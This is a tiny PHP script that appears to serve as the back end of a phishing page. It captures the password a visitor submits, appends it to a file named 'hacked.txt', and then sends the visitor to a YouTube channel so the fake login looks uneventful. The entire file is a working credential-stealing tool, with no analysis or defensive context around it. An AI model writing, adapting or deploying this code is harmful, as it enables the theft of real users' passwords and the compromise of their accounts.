<?php

file_put_contents("hacked.txt", " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header('Location: https://www.youtube.com/channel/UCETGaKCbErRDWDIiykdNIWw');
?>